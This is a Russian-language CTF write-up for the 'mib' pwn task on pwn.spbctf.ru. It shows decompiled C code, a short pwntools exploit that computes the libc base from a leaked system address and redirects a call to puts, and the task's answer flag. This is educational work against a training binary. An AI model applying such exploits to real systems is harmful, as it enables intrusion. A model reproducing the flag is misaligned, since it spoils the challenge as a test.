[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn3_mib)
Описание:
Внимание в бинарике чтение входных данных ошибочно делается из файлового дескриптора stdout - 1, поэтому если запускать бинарь из pwntools, то прога\ зависнет, но если запускать прогу из консоли, либо повесить прогу на socat или qira -s то все будет хорошо
`nc 109.233.56.90 11624`
**[mib](https://pwn.spbctf.ru/files/aslr/mib/mib)**  
**[libc.so.6](https://pwn.spbctf.ru/files/aslr/mib/libc.so.6)**

Программа печатает в stdout флаг, а затем вызывает функцию по введённому адресу `buf` с параметром `stdout`. 
``` c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 buf[33]; 

  puts("gifts:");
  system("md5sum /lib/x86_64-linux-gnu/libc.so.6");
  printf("system: %p\n", &system);

  printf("Your last words: ");
  buf[0] = '\xCA\xFE\xBA\xBE';
  read(1, buf, 8u);

  fprintf(stdout, "flag: %s", flag);
  (buf[0])(stdout);

  _exit(1);
}
```

Необходимо считать адрес `system`, вычислить `libc_base`, а затем записать в buf адрес функции `puts`, чтобы считать с `stdout` флаг.
Оффсеты функций:
![{90F3F17E-2C93-44CE-8DD9-877679A630DD}](../../../../z.%20Images/{90F3F17E-2C93-44CE-8DD9-877679A630DD}.png)
![{F7FC869F-F4F2-4C7B-AEBC-D9F8F6BEF220}](../../../../z.%20Images/{F7FC869F-F4F2-4C7B-AEBC-D9F8F6BEF220}.png)

Эксплоит:
``` python
system_offset = 0x55410
puts_offset = 0x875A0

io = start()

io.recvline()
io.recvline()
io.recvuntil(b'system: ')
system = int(io.recvline().decode(), 16)

libc_base = system - system_offset
payload = libc_base + puts_offset

io.sendline(p64(payload))

io.interactive()
```

Запуск:
![{CDBAED9A-46B2-4503-A469-9B67CF60AFB1}](../../../../z.%20Images/{CDBAED9A-46B2-4503-A469-9B67CF60AFB1}.png)

Ответ: `spbctf{5dbdc152ef4be37efde7066f45705c55}`